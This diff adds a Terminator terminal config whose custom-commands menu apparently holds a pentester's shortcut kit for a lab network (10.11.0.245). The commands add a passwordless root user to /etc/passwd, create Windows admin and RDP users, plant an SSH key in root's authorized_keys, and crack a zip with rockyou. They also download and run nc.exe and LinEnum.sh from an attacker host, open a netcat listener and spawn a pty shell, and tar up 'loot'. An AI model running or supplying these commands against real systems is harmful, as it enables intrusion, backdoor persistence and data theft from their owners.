@@ -1,0 +1,126 @@
+[global_config]
+  enabled_plugins = CustomCommandsMenu, LaunchpadCodeURLHandler, APTURLHandler, LaunchpadBugURLHandler
+  inactive_color_offset = 0.902777777778
+  title_inactive_bg_color = "#2b2931"
+  title_inactive_fg_color = "#555753"
+  title_transmit_bg_color = "#4e9a06"
+[keybindings]
+[layouts]
+  [[default]]
+    [[[child1]]]
+      parent = window0
+      profile = default
+      type = Terminal
+    [[[window0]]]
+      parent = ""
+      type = Window
+[plugins]
+  [[CustomCommandsMenu]]
+    [[[Linux/Search network-secret.txt]]]
+      command = find / -iname network-secret.txt 2>/dev/null
+      enabled = True
+      name = Linux/Search network-secret.txt
+      position = 17
+    [[[Linux/add spotless as root to etc:passwd]]]
+      command = echo 'spotless::0:0:root:/root:/bin/bash' >> /etc/passwd
+      enabled = True
+      name = Linux/add spotless as root to etc:passwd
+      position = 16
+    [[[Linux/crack zip file]]]
+      command = fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt bank-account.zip
+      enabled = True
+      name = Linux/crack zip file
+      position = 9
+    [[["Linux/find txt,zip,bak,rar,tar,md files"]]]
+      command = "find {/root/,/var/www,/tmp/,/opt/,/home/,/etc/} -exec ls -l {} \; | grep -E '\.txt|\.zip|\.bak|\.rar|\.md|\.tar' | tee /tmp/files.log; cp files.log /var/www"
+      enabled = True
+      name = "Linux/find txt,zip,bak,rar,tar,md files"
+      position = 18
+    [[[Win/Search network-secret.txt]]]
+      command = dir /s/b c:\* | findstr /i network-secret.txt
+      enabled = True
+      name = Win/Search network-secret.txt
+      position = 19
+    [[['Win/add spotless to "remote desktop users"']]]
+      command = net localgroup "remote desktop users" spotless /add
+      enabled = True
+      name = 'Win/add spotless to "remote desktop users"'
+      position = 12
+    [[[Win/create user spotless; add to admins group;]]]
+      command = net user spotless spotless /add & net localgroup Administrators spotless /add
+      enabled = True
+      name = Win/create user spotless; add to admins group;
+      position = 11
+    [[[Win/download wget.vbs via ftp]]]
+      command = tftp -i 10.11.0.245 get wget.vbs .
+      enabled = True
+      name = Win/download wget.vbs via ftp
+      position = 15
+    [[[Win/drop NC via cscript]]]
+      command = cscript wget.vbs http://10.11.0.245/netcat/nc.exe nc.exe
+      enabled = True
+      name = Win/drop NC via cscript
+      position = 10
+    [[[curl launch LinEnum.sh. Results in www]]]
+      command = cd /tmp; curl -O http://10.11.0.245/privesc/LinEnum.sh; chmod 775 *.sh; ./LinEnum.sh | tee enum.log; cp enum.log /var/www/html/
+      enabled = True
+      name = curl launch LinEnum.sh. Results in www
+      position = 6
+    [[[ftp server]]]
+      command = twistd -n ftp -p 21 -r /root/tools/
+      enabled = True
+      name = ftp server
+      position = 2
+    [[[http server in current dir]]]
+      command = python -m SimpleHTTPServer 80
+      enabled = True
+      name = http server in current dir
+      position = 0
+    [[[http server in root-tools]]]
+      command = cd /root/tools; python -m SimpleHTTPServer 80
+      enabled = True
+      name = http server in root-tools
+      position = 1
+    [[[include ssh key to authorized_keys]]]
+      command = mkdir /root/.ssh 2>/dev/null; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQChKCUsFVWj1Nz8SiM01Zw/BOWcMNs2Zwz3MdT7leLU9/Un4mZ7vjco0ctsyh2swjphWr5WZG28BN90+tkyj3su23UzrlgEu3SaOjVgxhkx/Pnbvuua9Qs9gWbWyRxexaC1eDb0pKXHH2Msx+GlyjfDOngq8tR6tkU8u1S4lXKLejaptiz0q6P0CcR6hD42IYkqyuWTNrFdSGLtiPCBDZMZ/5g1cJsyR59n54IpV0b2muE3F7+NPQmLx57IxoPjYPNUbC6RPh/Saf7o/552iOcmVCdLQDR/9I+jdZIgrOpstqSiJooU9+JImlUtAkFxZ9SHvtRbFt47iH7Sh7LiefP5 root@kali' >> /root/.ssh/authorized_keys
+      enabled = True
+      name = include ssh key to authorized_keys
+      position = 14
+    [[[interactive stty]]]
+      command = stty -echo raw
+      enabled = True
+      name = interactive stty
+      position = 5
+    [[[ll -lah]]]
+      command = "alias ll='ls -lah'"
+      enabled = True
+      name = ll -lah
+      position = 13
+    [[[nc listener 4444]]]
+      command = nc -lp 4444 -vv
+      enabled = True
+      name = nc listener 4444
+      position = 3
+    [[[spawn python shell]]]
+      command = '''python -c 'import pty; pty.spawn("/bin/bash")''''
+      enabled = True
+      name = spawn python shell
+      position = 4
+    [[[tar current dir and move to tmp:spotless]]]
+      command = loot=$(basename $(pwd)); tar -cvf $loot.tar * ; mkdir /tmp/spotless 2>/dev/null; mv $loot.tar /tmp/spotless;
+      enabled = True
+      name = tar current dir and move to tmp:spotless
+      position = 8
+    [[[wget launch LinEnum.sh. Results in www]]]
+      command = cd /tmp; wget http://10.11.0.245/privesc/LinEnum.sh; chmod 775 *.sh; ./LinEnum.sh | tee enum.log ; cp enum.log /var/www/html/
+      enabled = True
+      name = wget launch LinEnum.sh. Results in www
+      position = 7
+[profiles]
+  [[default]]
+    background_color = "#222028"
+    background_darkness = 0.97
+    background_type = transparent
+    cursor_color = "#aaaaaa"
+    foreground_color = "#a7b88c"
+    scrollback_infinite = True
